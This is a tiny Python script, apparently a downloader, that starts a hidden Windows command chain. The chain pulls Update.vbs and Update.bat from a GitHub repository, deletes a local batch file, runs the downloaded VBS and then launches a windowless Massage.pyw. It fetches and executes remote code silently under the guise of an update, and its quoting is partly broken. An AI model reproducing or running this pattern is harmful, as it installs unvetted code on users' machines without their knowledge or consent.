import os
import subprocess
subprocess.Popen('timeout /t 10 && powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs" && del Update.bat && powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat && timeout /t 5 && start Update.vbs && timeout /t 5 && timeout /t 300 && Massage.pyw', shell=True)
